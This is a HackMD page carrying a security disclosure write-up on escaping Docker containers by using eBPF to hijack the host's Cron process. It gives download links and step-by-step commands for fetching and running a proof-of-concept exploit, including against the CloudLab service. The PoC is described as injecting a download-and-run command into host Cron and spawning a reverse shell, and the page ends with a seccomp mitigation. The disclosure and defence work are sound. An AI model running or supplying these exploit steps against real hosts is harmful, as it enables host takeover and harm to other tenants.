<!DOCTYPE html>
<html lang="en-US" data-themeable="true">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="csrf-token" content="30fmEFLr-NTm3w8lOUQG4Y0omptaGEaH6fHA">
    
    
    <meta name="description" content="# Universal Container Escape with eBPF  ## Attack Detail Inside a Container, the attackers can use e">
    
    <title>Universal Container Escape with eBPF - HackMD</title>
    <link rel="icon" type="image/png" href="https://hackmd.io/favicon.png">
	<link rel="apple-touch-icon" href="https://hackmd.io/apple-touch-icon.png">
	<!--  meta value for server side given sign in boolean -->
    <meta name="signin" content="false">

    
<script nonce="9818f22c-8d86-4caf-aa8e-b1b6399c33f3">
  window.domain = 'hackmd.io'
  window.urlpath = ''
  window.debug = false || window.localStorage.getItem('HMD_DEBUG_FLAG') === 'true'
  window.version = '1.3.0'
  window.brand = 'HackMD'

  
  window.NOTE_ID = 'iF-2-NLVS6-94HcBM551vA'
  

  window.GOOGLE_DRIVE_API_KEY = 'AIzaSyAHmcP5gL_64ZafuAYOvJruFAIaYgHQaY4'
  window.GOOGLE_DRIVE_CLIENT_ID = '65857506266-76uhhee8se8dgs1i0q8fhtj1prg0ar27.apps.googleusercontent.com'
  window.DROPBOX_APP_KEY = 'rdoizrlnkuha23r'
  
  window.PLANTUML_SERVER = 'https://ptuml.hackmd.io'

  window.ASSET_URL = 'https://assets.hackmd.io'

  window.USER_CAN_CREATE_TEAM = true
  window.USER_CAN_DELETE_ACCOUNT = true
  window.USER_DELETE_ACCOUNT_VIA_EMAIL = true
  window.PAYMENT_ENABLED = true
  window.PAYMENT_PROMOTION_BANNER_ENABLED = false
  window.GITHUB_SYNC_ENABLED = true
  window.GITLAB_SYNC_ENABLED = false
  window.GITLAB_SYNC_BASE_URL = ''
  window.VCS_SYNC_MODE = 'github'
  window.VCS_PROVIDER_NAME = 'GitHub'
  window.FREE_TEAM_NUM = 20
  window.FREE_TEAM_MEMBER_NUM = 3
  window.FREE_PUBLIC_TEAM_NUM = 10
  window.NEO_OVERVIEW_UI = true
  window.FOLDER_ENABLE = true
  
  window.EE_SITE_ENABLE = false
  window.EE_SITE_NAME = 'false'
  window.EE_SITE_LINK = 'false'
  window.EESITE_INFO = false
  window.ENTERPRISE_DISCOVERY_ENABLE = false
  window.ENTERPRISE_DISCOVERY_TEAM = true
  window.ENTERPRISE_DISCOVERY_NOTE = true
  window.ENTERPRISE_DISCOVERY_VIEW_PERMISSION = 'guest'
  
  window.ALLOW_ANONYMOUS = true
  window.ALLOW_ANONYMOUS_EDIT = false
  window.ALLOW_DOWNLOAD_PDF = true
  window.PUBLIC_OVERVIEW = false
  window.INTERNAL_PUBLIC_OVERVIEW = false
  window.FULL_TEXT_SEARCH_ENABLE = false
  window.ALGOLIA_SEARCH_ENABLE = true
  window.MARKETING_EMAIL_ENABLE = true
  window.OFFLINE_ACCESS = true
  
  
  
    window.WALLET_CONNECT_PROJECT_ID = '91d6fa182b725b5895a17a170a5878c1'
  
  window.API_MANAGEMENT_UI_ENABLE = true
  window.FEEDBACK_UI_ENABLE = true
  window.PUBLISH_ENABLE = true

  

  
  window.SHOW_HOT_NOTES = false
  

  
  window.HOT_NOTES_TIME_TYPE = 'week'
  

  
  window.SHOW_OVERVIEW = false
  

  
  window.MENTIONS = {}
  

  
  window.MENTION_ANCHORS = []
  

  
  window.COMMENT_ANCHORS = []
  

  
  window.IS_OWNER = false
  

  
  window.IS_TEAM_ADMIN = false
  

  
  window.IS_INVITEE_ADMIN = false
  

  
  window.USER_PROFILE = '%7B%22name%22%3A%22Guest%20Miles%22%7D'
  

  
  window.VERSION_TIME = '1666684756185'
  

  
  window.canEdit = false
  

  
  window.canWriteComment = false
  

  
  window.canHideComment = false
  

  window.TRASH_NOTE_DELETE_AFTER_FREE = 3
  window.TRASH_NOTE_DELETE_AFTER_PAID = 30

  
    window.ENABLED_PREVIEW_FEATURE = {}
  

  
    window.IS_OWNER_UPGRADED = false
  

  
    window.IMGUR_FALLBACK_CDN = 'https://imgur-backup.hackmd.io'
  

  
    window.CLOUD_META_UI = true
  
  
    window.CLOUD_META_API = true
  
  
    window.CLOUD_META_MIGRATION = false
  
  
    window.YAML_METADATA_ENABLED = false
  

  
    window.NOTE_CAPACITY_LIMIT = 50
  

  
    window.DOCUMENT_MAX_LENGTH = 100000
  

  
    window.SOCIAL_NETWORK_FEATURES_ENABLED = true
  

  
    window.PUBLISHMENT_MODERATION_ENABLED = true
  

  
    window.COMMENT_ENABLED = true
  

  window.SUGGEST_EDIT_ENABLED = true
  
    window.SUGGEST_EDIT_ENABLED = true
  

  
    window.REALTIME_CLIENT_WITH_CREDENTIALS = false
  

  
    window.COMMENT_ENABLED = true
  

  
    window.DEBUG_DISCONNECT_SOCKET_WHEN_OFFLINE = false
  

  

  

  

  
    window.CUSTOM_STYLE_ENABLED = "true"
  

  
    window.USE_NEW_LOGO = true
  

  
    window.ITERABLE_ENABLED = true
  
  
    window.ITERABLE_API_KEY = "c2c36a44c2614fb19aa3b46d660bbce2"
  

  
    window.TEXT_SELECTION_CHANGED = false
  

  
    window.CAN_VIEW_HISTORY_AT_REVISION = false
  
</script>


    
<!-- Google Tag Manager -->
<script nonce="9818f22c-8d86-4caf-aa8e-b1b6399c33f3">(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-KLW9Z3');</script>
<!-- End Google Tag Manager -->


    





    <meta property="fb:app_id" content="1436904003272070">



    <meta name="twitter:image:src" content="https://hackmd.io/images/media/HackMD-neo-og.jpg">
    <meta name="twitter:image:alt" content="Universal Container Escape with eBPF - HackMD">


<meta name="twitter:site" content="@hackmdio" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:title" content="Universal Container Escape with eBPF - HackMD" />


    <meta name="twitter:description" content="# Universal Container Escape with eBPF  ## Attack Detail Inside a Container, the attackers can use e" />



    <meta property="og:image" content="https://hackmd.io/images/media/HackMD-neo-og.jpg">
    <meta property="og:image:alt" content="Universal Container Escape with eBPF - HackMD">


<meta property="og:site_name" content="HackMD" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Universal Container Escape with eBPF - HackMD" />


    <meta property="og:description" content="# Universal Container Escape with eBPF  ## Attack Detail Inside a Container, the attackers can use e" />




     <link href="https://assets.hackmd.io/build/font-vendor.css" rel="stylesheet"><link href="https://assets.hackmd.io/build/font-vendor.ea8218d7d4f468b2c430.css" rel="stylesheet"><link href="https://assets.hackmd.io/build/common-vendor.css" rel="stylesheet"><link href="https://assets.hackmd.io/build/common-vendor.0a08ae20e14fefe857eb.css" rel="stylesheet"><link href="https://assets.hackmd.io/build/pretty-vendor.css" rel="stylesheet"><link href="https://assets.hackmd.io/build/pretty-vendor.db0e7b64c54d0a77290f.css" rel="stylesheet"><link href="https://assets.hackmd.io/build/pretty.css" rel="stylesheet"><link href="https://assets.hackmd.io/build/pretty.206c1db4aa617ea5aa67.css" rel="stylesheet">
    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
<!--[if lt IE 9]>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js" integrity="sha256-3Jy/GbSLrg0o9y5Z5n1uw0qxZECH7C6OQpVBgNFYa0g=" crossorigin="anonymous"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/respond.js/1.4.2/respond.min.js" integrity="sha256-g6iAfvZp+nDQ2TdTR/VVKJf3bGro4ub5fvWSWVRi2NE=" crossorigin="anonymous"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/es5-shim/4.5.9/es5-shim.min.js" integrity="sha256-8E4Is26QH0bD52WoQpcB+R/tcWQtpzlCojrybUd7Mxo=" crossorigin="anonymous"></script>
<![endif]-->

    


    <script defer data-domain="hackmd.io" src="https://plausible.io/js/script.js"></script>
<script nonce="9818f22c-8d86-4caf-aa8e-b1b6399c33f3">
  window.plausible = window.plausible || function() { (window.plausible.q = window.plausible.q || []).push(arguments); }
  const keyboardWhiteList = ['a', 'span', 'button']

  function getTaggedEventAttributes (e) {
    const eventAttrs = { name: null, props: {} }
    if (!e || !e.classList) return eventAttrs
    const psEvent = /plausible-event-(.+)(=|--)(.+)/
    for (const className of [...e.classList]) {
      const [, key, , val] = className.match(psEvent) || []
      if (!key || !val) continue
      const value = val.replace(/\+/g, ' ')
      switch (key.toLowerCase()) {
        case 'name':
          eventAttrs.name = value
          break
        default:
          eventAttrs.props[key] = value
          break
      }
    }
    return eventAttrs
  }

  function isLocal () {
    return /^localhost$|^127(\.[0-9]+){0,2}\.[0-9]+$|^\[::1?\]$/.test(location.hostname) || location.protocol === 'file:'
  }

  function isAutomation () {
    return Boolean(window._phantom || window.__nightmare || window.navigator.webdriver || window.Cypress)
  }

  function shouldIgnore () {
    return isLocal() ||
      isAutomation() ||
      window.localStorage.getItem('plausible_ignore') === 'true'
  }

  function handler (e) {
    if (!window.plausible) return
    if (!e.target || !('className' in e.target)) return
    const ele = e.target

    const eventAttrs = getTaggedEventAttributes(ele)
    if (!eventAttrs.name) return
    if (ele?.href) eventAttrs.props.url = ele.href

    if (shouldIgnore()) {
      if (window.debug) logDebugEventMsg(eventAttrs)
      return
    }
    window.plausible(eventAttrs.name, { props: eventAttrs.props })
  }

  function logDebugEventMsg (eventAttrs) {
    console.warn(
      `Ignoring Event: "${eventAttrs.name}"`,
      eventAttrs,
    )
  }

  function keydownHandler (e) {
    if (e.key !== 'Enter') return
    if (e.target.nodeName.toLowerCase() === 'input') {
      switch (e.target.type.toLowerCase()) {
        case 'submit':
        case 'button':
        case 'reset':
        case 'checkbox':
        case 'radio':
        case 'file':
        case 'image':
        case 'color':
          break
        default:
          return
      }
    } else if (!keyboardWhiteList.includes(e.target.nodeName.toLowerCase())) {
      return
    }
    handler(e)
  }

  document.addEventListener('mousedown', handler)
  document.addEventListener('keydown', keydownHandler)
</script>

    
<script nonce="9818f22c-8d86-4caf-aa8e-b1b6399c33f3">
  window.publishProps = JSON.parse(`{"isOwnerAnonymous":false,"isOwnedByTeam":false,"ownerInfo":{"name":"fripSide","path":"ebpf","avatarUrl":"https%3A%2F%2Flh3.googleusercontent.com%2Fa-%2FACNPEu8q5aRLkH3sGKXfIyhOIZxNtdl_nbLGYJRuvrhZbw%3Ds96-c","description":null},"isPublished":false,"createTime":1664333484474,"updateTime":1666684756185,"vcsSyncMode":"github","vcsProviderName":"GitHub","canEdit":false,"hardBreaks":true,"onlyOwnerCanEdit":true,"isCommentEnabled":true,"likedCount":0,"isNotificationEnabled":true,"notificationType":"never","hasEmail":false,"canWriteComment":false,"viewCount":2908,"markdown":"%23%20Universal%20Container%20Escape%20with%20eBPF%0A%0A%23%23%20Attack%20Detail%0AInside%20a%20Container%2C%20the%20attackers%20can%20use%20eBPF%20tracing%20program%20(e.g.%2C%20KProbe)%20to%20hijack%20the%20processes%20out%20of%20the%20containers%20via%20writing%20their%20memory%20and%20opened%20files%20with%20the%20bpf_probe_write_user%20helper.%20By%20injecting%20malicious%20commands%20%20(e.g.%2C%20spawn%20a%20reverse%20shell%20to%20the%20attacker's%20host)%20to%20a%20privilege%20process%20(e.g.%2C%20bash%2C%20Cron)%20in%20Host%20VM%2C%20the%20attackers%20can%20execute%20commands%20in%20the%20host%20to%20get%20control%20of%20the%20host%20VM%20and%20escape%20the%20container.%20%0A%0A%0A%23%23%20Exploit%20Any%20Container%20on%20Ubuntu%2020.04%0AHere%20is%20a%20PoC%20for%20hijacking%20the%20Cron%20process%20in%20Ubuntu%2020.04.%20You%20can%20run%20a%20container%20with%20CAP_SYS_ADMIN%20in%20Ubuntu%2020.04%2C%20and%20execute%20the%20PoC%20program%20inside%20the%20container%20to%20hijack%20the%20host's%20Cron%20process%20and%20escape%20the%20container.%20%20%0A%0A%23%23%23%23%20Get%20the%20PoC%0APoC%20Links%3A%20%5BLink1%5D(https%3A%2F%2Fcloud.tsinghua.edu.cn%2Ff%2F063dd19446d24119b860%2F%3Fdl%3D1)%20%20or%20%5BLink2%5D(https%3A%2F%2Fdrive.google.com%2Ffile%2Fd%2F1glJCZVZuHCT9Y_V4PvQ9s_KXLf2AVBHX%2Fview%3Fusp%3Dsharing)%20%20%0A%0AThe%20PoC%20files%20contains%20several%20simple%20files%2C%0A%60%60%60%20bash%0A%5Cevil_test%0A%E2%94%9C%E2%94%80%E2%94%80%20Dockerfile%0A%E2%94%9C%E2%94%80%E2%94%80%20README.txt%0A%E2%94%9C%E2%94%80%E2%94%80%20Vagrantfile%0A%E2%94%9C%E2%94%80%E2%94%80%20build.sh%0A%E2%94%9C%E2%94%80%E2%94%80%20exploit%0A%E2%94%94%E2%94%80%E2%94%80%20run.sh%0A%60%60%60%0A%0A%23%23%23%23%20Run%20the%20PoC%0AStep-1%3A%20Create%20a%20VM%20with%20Ubuntu%2020.04.%0A%60%60%60%20bash%0A%24%20tee%20-a%20Vagrantfile%20%3C%3CEOF%0AVagrant.configure(%222%22)%20do%20%7Cconfig%7C%0A%20%20config.vm.box%20%3D%20%22generic%2Fubuntu2004%22%0Aend%0AEOF%0A%0A%24%20vagrant%20init%0A%24%20vagrant%20up%0A%24%20vagrant%20ssh%0A%60%60%60%0A%0AStep-2%3A%20Launch%20the%20container%20and%20perform%20attack.%0A%60%60%60%20bash%0A%23%20in%20the%20vagrant%20VM%0A%24%20wget%20https%3A%2F%2Fcloud.tsinghua.edu.cn%2Ff%2F063dd19446d24119b860%2F%3Fdl%3D1%20-O%20evil_test.zip%0A%24%20unzip%20evil_test.zip%0A%24%20cd%20evial_test%0A%24%20bash%20build.sh%0ATick%3A%201%0ATick%3A%202%0A...%0A%60%60%60%0A%0ANote%20that%20the%20%60build.sh%60%20will%20build%20and%20run%20the%20following%20Dockfile.%20%0A%60%60%60%20bash%0AFROM%20ubuntu%3A20.04%20%20%20%20%20%20%20%20%0AARG%20DEBIAN_FRONTEND%3Dnoninteractive%20%20%20%20%20%20%20%20%0ARUN%20apt%20update%20-y%0ARUN%20apt%20install%20-y%20wget%0ACOPY%20.%2Fexploit%20%2F%0ACOPY%20.%2Frun.sh%20%2F%0ACMD%20%5B%22%2Fbin%2Fbash%22%2C%22%2Frun.sh%22%5D%0A%60%60%60%0A%0A%0AStep-3%3A%20Check%20if%20the%20eBPF%20exploit%20program%20can%20success%20to%20escape%20the%20container.%20%20%20%0A%0AThe%20eBPF%20%60exploit%60%20program%20will%20hijack%20the%20Cron%20of%20the%20host%20from%20the%20container.%20It%20will%20inject%20a%20command%20to%20the%20Cron%20to%20download%20and%20run%20a%20bash%20file%2C%20e.g.%2C%20the%20%60attack.sh%60%20which%20create%20a%20directory%20and%20file%20at%20%60%2Froot%60.%20If%20it%20success%20to%20escape%20the%20container%2C%20you%20will%20find%20a%20file%20with%20content%20%60pwn%60%20created%20in%20the%20path%20%60%2Froot%2Fevil_escape%2Fescape%20%60.%0A%0A%60%60%60%20bash%0A%23%20in%20the%20vagrant%20VM%0A%24%20ls%20%2Froot%2Fevil_escape%2Fescape%0A%2Froot%2Fevil_escape%2Fescape%20%20xxx%0A%0A%24%20cat%20%2Froot%2Fevil_escape%2Fescape%20%0Apwn%0A%60%60%60%0A%0ANote%20that%2C%20the%20attackers%20actually%20can%20execute%20any%20commands%20in%20the%20%60attack.sh%60%20more%20than%20write%20files%20to%20%60%5Croot%60.%0A%0A%0A%23%23%20Exploit%20the%20CloudLab%0ACloudLab%20is%20a%20Docker%20based%20desktop%20environment.%20It%20has%20thousands%20of%20users%20and%20some%20of%20them%20deploy%20it%20online%20as%20public%2Fprivate%20programming%20services.%20Users%20can%20run%20code%20in%20their%20online%20shell.%20Accordingly%2C%20attackers%20can%20escape%20the%20container%20via%20eBPF%20and%20harm%20other%20users'%20container%20instances.%20%20%20%20%0A%0AHere's%20the%20steps%20to%20run%20the%20exploit%20file%20in%20the%20container's%20shell%20of%20CloudLab.%0A%60%60%60%20bash%0A%2F%2F%20inside%20the%20container%0A%24%20tools%2Fdocker%2Frun%0A%23%20wget%20https%3A%2F%2Fcloud.tsinghua.edu.cn%2Ff%2F886e8962ccb4472d8eb7%2F%3Fdl%3D1%20-O%20ebpf_exploit%0A%23%20chmod%20%2Bx%20ebpf_exploit%0A%23.%2Febpf_exploit%0ATick%3A%201%0ATick%3A%202%0A...%0A%60%60%60%0AThen%2C%20the%20container%20is%20escaped%20and%20can%20spwan%20a%20reserve%20shell%20to%20the%20attacker's%20server.%0A%0ANote%20that%20this%20issue%20has%20been%20fixed%20at%20Jun%2030%202022%20after%20we%20disclose%20it%20to%20the%20TinyLab.%20%0A%0A%23%23%23%20Mitigate%0ATo%20run%20container%20with%20cap%20SYS_ADMIN%2C%20eBPF%20should%20be%20disabled.%20%0AFor%20example%2C%20we%20can%20set%20a%20seccomp%20rule%20for%20the%20Docker%20to%20deny%20the%20sys_bpf.%20You%20can%20write%20a%20Seccomp%20profile%20just%20like%20this%2C%20%20%20%20%0Ahttps%3A%2F%2Fgithub.com%2Ftinyclub%2Fcloud-lab%2Fblob%2Fd19ff92713685a7fb84b423dea6a184b25c378c9%2Fconfigs%2Fcommon%2Fseccomp-profiles-default.json%0A%0A%0AThen%2C%20you%20can%20use%20the%20%60--security-opt%20seccomp%3Dprofile.json%60%20flag%20to%20launch%20the%20Docker%20image%20with%20seccomp%20rules.%0A%0A%60%60%60%20bash%0Adocker%20run%20-it%20--name%20container_test%20--security-opt%20seccomp%3Dprofile.json%20ubuntu%3A20.04%20bash%0A%60%60%60","viewMode":"publish","isOwner":false,"isSignIn":false,"isLiked":false,"isBookmarked":false,"publishType":"view","commentCount":0,"isNotesRecommendationsEnabled":true,"recommendedNotes":[],"lastChangeUserInfo":{"name":"fripSide","path":"ebpf","avatarUrl":"https%3A%2F%2Flh3.googleusercontent.com%2Fa-%2FACNPEu8q5aRLkH3sGKXfIyhOIZxNtdl_nbLGYJRuvrhZbw%3Ds96-c"}}`);
  (function () {
    const decodeStringProps = (props) => {
      for (const key in props) {
        if (typeof props[key] === 'string') {
          props[key] = decodeURIComponent(props[key])
        } else if (typeof props[key] === 'object') {
          decodeStringProps(props[key])
        }
      }
    }
    decodeStringProps(window.publishProps)
  })()
</script>

    <script src="https://tally.so/widgets/embed.js"></script>

    
</head>

<body style="display:none;">
    <div id="toasts-container" class="toasts-container z-[2000]"></div>
    <div id="publish-page"># Universal Container Escape with eBPF

## Attack Detail
Inside a Container, the attackers can use eBPF tracing program (e.g., KProbe) to hijack the processes out of the containers via writing their memory and opened files with the bpf_probe_write_user helper. By injecting malicious commands  (e.g., spawn a reverse shell to the attacker&#39;s host) to a privilege process (e.g., bash, Cron) in Host VM, the attackers can execute commands in the host to get control of the host VM and escape the container. 


## Exploit Any Container on Ubuntu 20.04
Here is a PoC for hijacking the Cron process in Ubuntu 20.04. You can run a container with CAP_SYS_ADMIN in Ubuntu 20.04, and execute the PoC program inside the container to hijack the host&#39;s Cron process and escape the container.  

#### Get the PoC
PoC Links: [Link1](https://cloud.tsinghua.edu.cn/f/063dd19446d24119b860/?dl=1)  or [Link2](https://drive.google.com/file/d/1glJCZVZuHCT9Y_V4PvQ9s_KXLf2AVBHX/view?usp=sharing)  

The PoC files contains several simple files,
``` bash
\evil_test
├── Dockerfile
├── README.txt
├── Vagrantfile
├── build.sh
├── exploit
└── run.sh
```

#### Run the PoC
Step-1: Create a VM with Ubuntu 20.04.
``` bash
$ tee -a Vagrantfile &lt;&lt;EOF
Vagrant.configure(&#34;2&#34;) do |config|
  config.vm.box = &#34;generic/ubuntu2004&#34;
end
EOF

$ vagrant init
$ vagrant up
$ vagrant ssh
```

Step-2: Launch the container and perform attack.
``` bash
# in the vagrant VM
$ wget https://cloud.tsinghua.edu.cn/f/063dd19446d24119b860/?dl=1 -O evil_test.zip
$ unzip evil_test.zip
$ cd evial_test
$ bash build.sh
Tick: 1
Tick: 2
...
```

Note that the `build.sh` will build and run the following Dockfile. 
``` bash
FROM ubuntu:20.04        
ARG DEBIAN_FRONTEND=noninteractive        
RUN apt update -y
RUN apt install -y wget
COPY ./exploit /
COPY ./run.sh /
CMD [&#34;/bin/bash&#34;,&#34;/run.sh&#34;]
```


Step-3: Check if the eBPF exploit program can success to escape the container.   

The eBPF `exploit` program will hijack the Cron of the host from the container. It will inject a command to the Cron to download and run a bash file, e.g., the `attack.sh` which create a directory and file at `/root`. If it success to escape the container, you will find a file with content `pwn` created in the path `/root/evil_escape/escape `.

``` bash
# in the vagrant VM
$ ls /root/evil_escape/escape
/root/evil_escape/escape  xxx

$ cat /root/evil_escape/escape 
pwn
```

Note that, the attackers actually can execute any commands in the `attack.sh` more than write files to `\root`.


## Exploit the CloudLab
CloudLab is a Docker based desktop environment. It has thousands of users and some of them deploy it online as public/private programming services. Users can run code in their online shell. Accordingly, attackers can escape the container via eBPF and harm other users&#39; container instances.    

Here&#39;s the steps to run the exploit file in the container&#39;s shell of CloudLab.
``` bash
// inside the container
$ tools/docker/run
# wget https://cloud.tsinghua.edu.cn/f/886e8962ccb4472d8eb7/?dl=1 -O ebpf_exploit
# chmod +x ebpf_exploit
#./ebpf_exploit
Tick: 1
Tick: 2
...
```
Then, the container is escaped and can spwan a reserve shell to the attacker&#39;s server.

Note that this issue has been fixed at Jun 30 2022 after we disclose it to the TinyLab. 

### Mitigate
To run container with cap SYS_ADMIN, eBPF should be disabled. 
For example, we can set a seccomp rule for the Docker to deny the sys_bpf. You can write a Seccomp profile just like this,    
https://github.com/tinyclub/cloud-lab/blob/d19ff92713685a7fb84b423dea6a184b25c378c9/configs/common/seccomp-profiles-default.json


Then, you can use the `--security-opt seccomp=profile.json` flag to launch the Docker image with seccomp rules.

``` bash
docker run -it --name container_test --security-opt seccomp=profile.json ubuntu:20.04 bash
```</div>
    <!-- signin modal -->

<div class="modal fade signin-modal" tabindex="-1" role="dialog" aria-labelledby="mySmallModalLabel" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <button type="button" class="close" data-dismiss="modal" aria-label="Close" style="margin-top: 10px; right: 20px; position: absolute;"><span aria-hidden="true">&times;</span></button>
            






    









<h3>Sign in</h3>

<form data-toggle="validator" role="form" class="form-horizontal" method="post" enctype="application/x-www-form-urlencoded" id="signin-form">
    <div class="hmd-dn"><input type="hidden" name="_csrf" value="30fmEFLr-NTm3w8lOUQG4Y0omptaGEaH6fHA"></div>
    <div class="hmd-dn"><input type="hidden" name="create_team" value="false"></div>
    <div class="hmd-dn"><input type="hidden" name="create_paid_team" value="false"></div>
    
    <div class="form-group  ">
        <label for="email" class="control-label">Email</label>
        <label for="inputEmail" class="control-label pull-right errors">
            
        </label>
        <span class="help-block control-label with-errors pull-right" style="margin-top: 14px"></span>
        <div class="input-block">
            
                <input type="email" class="form-control" name="email" placeholder="Your email" required autocomplete="email">
            
            <span class="error-sign"></span>
        </div>
    </div>
    <div class="form-group ">
        <label for="password" class="control-label">Password</label>
        <label for="inputPassword" class="control-label pull-right errors">
            
        </label>
        <span class="help-block control-label with-errors pull-right" style="margin-top: 14px"></span>
        <div class="input-block">
            <input type="password" class="form-control" name="password" placeholder="Your password" required autocomplete="current-password" maxlength="128">
            <span class="error-sign"></span>
            
                <span class="control-label pull-right !text-normal !leading-normal !font-normal !mt-1.5"><a href="https://hackmd.io/settings/forgotPassword" style="text-decoration: underline;">Forgot password</a></span>
            
        </div>
    </div>

    <div style="text-align: center; padding-top: 15px; margin-bottom: 0px;">
        <div
            hidden
            id="hmd-captcha"
            data-provider=""
            data-captcha-data=""
            class="flex justify-center"
        ></div>

        
            <input type="submit" class="neo-btn neo-btn-primary !justify-center !py-3.5 !mx-auto" formaction="https://hackmd.io/login" value="Sign in">
        

        
    </div>
</form>














    
        <p class="separator">or</p>
    

    
        <p>By clicking below, you agree to our <a href="https://hackmd.io/s/terms" target="_blank">terms of service</a>.</p>
    

    












<script id="gsi-client" src="https://accounts.google.com/gsi/client" async defer nonce="9818f22c-8d86-4caf-aa8e-b1b6399c33f3"></script>
<script nonce="9818f22c-8d86-4caf-aa8e-b1b6399c33f3">
    function handleCredentialResponse(response) {
        const form = document.getElementById('sign-in-with-google-form')
        form.children.credential.value = response.credential
        form.children.method.value = location.href.toLowerCase() === 'https://hackmd.io/settings#general' ? 'merge' : 'login'
        form.submit()
    }
    var GSI_READY = new Promise(function (resolve) {
        function initialize () {
            google.accounts.id.initialize({
                client_id: '911617723593-drikdibvvn63slfd6kbqigo8ql1no55s.apps.googleusercontent.com',
                callback: handleCredentialResponse
            })
            const loginPath = '/login'
            const joinPath = '/join'
            const renderButton = function () {
                google.accounts.id.renderButton(
                    document.getElementById('sign-in-with-google-button'),
                    { type: 'standard', width: 250 }
                )
            }
            if (location.pathname.toLowerCase() === loginPath || location.pathname.toLowerCase() === joinPath) {
                renderButton()
            } else {
                $('.signin-modal').one('shown.bs.modal', function () {
                    renderButton()
                })
            }
            resolve()
        }

        window.addEventListener('load', function () { initialize() })
    })
</script>
<form class="hidden" id="sign-in-with-google-form" action="/auth/google" method="post">
    <input type="hidden" name="credential">
    <input type="hidden" name="method">
</form>


<div class="social-buttons-container">
    
    <div id="sign-in-with-google-button"></div>
    
    
    <a href="https://hackmd.io/auth/facebook" class="btn btn-lg btn-block btn-social btn-facebook">
        <i class="fa fa-facebook"></i> Sign in via Facebook
    </a>
    
    
    <a href="https://hackmd.io/auth/twitter" class="btn btn-lg btn-block btn-social btn-twitter">
        <i class="fa fa-twitter"></i> Sign in via Twitter
    </a>
    
    
    <a href="https://hackmd.io/auth/github" class="btn btn-lg btn-block btn-social btn-github">
        <i class="fa fa-github"></i> Sign in via GitHub
    </a>
    
    
    <a href="https://hackmd.io/auth/dropbox" class="btn btn-lg btn-block btn-social btn-dropbox">
        <i class="fa fa-dropbox"></i> Sign in via Dropbox
    </a>
    
    
    
      <a href="#" class="bg-white btn btn-block btn-social btn-web3 bg-gray-800 hocus:bg-[#2b2b2b] text-white hocus:text-white">
          <img src="https://hackmd.io/images/wallet.svg" style="max-height: 20px; margin-top: 8px; margin-left: 6px; border: none;">
          <span class="sign-in-wallet-text">
              Sign in with Wallet
          </span>

          <div class="inline-flex items-center justify-between w-full hidden web3-wallet-info">
              <span>
                   Wallet
                   (
                    <span class="web3-wallet-address"></span>
                   )
              </span>

              <i class="fa fa-arrow-right" aria-hidden="true"></i>
          </div>
      </a>

      <small class="web3-wallet-info hidden text-left hocus:text-white underline hocus:underline block pt-2 ui-disconnect-connected-wallets text-gray-600 cursor-pointer">
          Connect another wallet
      </small>
    
</div>




    <div >
        <p>New to HackMD? <a href="https://hackmd.io/join" class="plausible-event-name=LoginModalSignUp">Sign up</a></p>
    </div>




        </div>
    </div>
</div>

    
    <script src="https://www.googletagmanager.com/gtag/js?id=G-NGVZMM6DR6"></script>
    <script nonce="9818f22c-8d86-4caf-aa8e-b1b6399c33f3">
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        let userid = (document.cookie.match('(^|; )userid=([^;]*)')||0)[2];
        gtag('config', 'G-NGVZMM6DR6', {'user_id': userid});
        
    </script>


    
<script src="https://browser.sentry-cdn.com/5.15.5/bundle.min.js" crossorigin="anonymous"></script>
<script nonce="9818f22c-8d86-4caf-aa8e-b1b6399c33f3">Sentry.init({ dsn: 'https://73410f1915d84abc8b2dd1f1aabd1c82@sentry.hackmd.dev/4', environment: 'production', integrations: function (intrus) { return intrus.filter(function (itr) { return itr.name !== 'TryCatch' }) } });</script>


    
<!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KLW9Z3"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->



    <script src="https://hackmd.io/api/i18n.js"></script>
     <script src="https://assets.hackmd.io/build/font-vendor.eaa8dd82d4e056021b8c.js" defer="defer"></script><script src="https://assets.hackmd.io/build/common-vendor.04da453a2a68f624f4d4.js" defer="defer"></script><script src="https://assets.hackmd.io/build/pretty-vendor.94ca39727118897623cd.js" defer="defer"></script><script src="https://assets.hackmd.io/build/pretty-common.e537850a918313f6b528.js" defer="defer"></script><script src="https://assets.hackmd.io/build/pretty.542e7daea665107a9e4b.js" defer="defer"></script>

    

</body>
</html>
